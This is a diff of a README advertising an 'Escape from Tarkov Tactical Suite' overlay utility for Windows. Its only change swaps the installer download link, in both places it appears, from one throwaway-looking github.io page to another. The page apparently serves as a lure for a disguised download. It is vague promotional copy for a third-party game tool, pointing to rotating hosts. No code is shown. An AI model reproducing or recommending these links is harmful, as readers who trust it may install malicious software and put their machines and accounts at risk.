@@ -2,7 +2,7 @@
 
 Escape from Tarkov Tactical Suite is a premium desktop utility designed to elevate your in-game experience by providing a clean, customizable overlay. This suite offers a real-time tactical HUD, an intelligent item tracker, and performance optimization tools, all without interfering with core gameplay mechanics. It is built specifically for dedicated players looking to streamline their raids on Windows 10/11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Setup-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Setup-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -53,7 +53,7 @@ A: Absolutely. The suite includes a full customization menu where you can change
 
 For the latest version and updates, please visit the official GitHub download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Escape from Tarkov Tactical Suite is a third-party utility and is not affiliated with, endorsed, or connected to Battlestate Games or Escape from Tarkov in any way. Use of third-party software is at your own risk.*
